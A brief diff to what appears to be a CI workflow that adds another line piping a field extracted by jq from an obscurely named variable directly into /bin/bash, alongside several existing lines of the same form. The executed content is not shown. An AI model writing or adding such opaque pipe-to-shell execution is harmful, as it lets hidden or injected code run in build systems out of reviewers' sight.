@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$hkc998" | jq -r .qzbm1236 | /bin/bash
           echo $ite4249 | jq -r .av36 | /bin/bash
           printf '%s' "$x2976" | jq -r .jnvja5 | /bin/bash
+          printf '%s' "$owfz09" | jq -r .rgw02 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
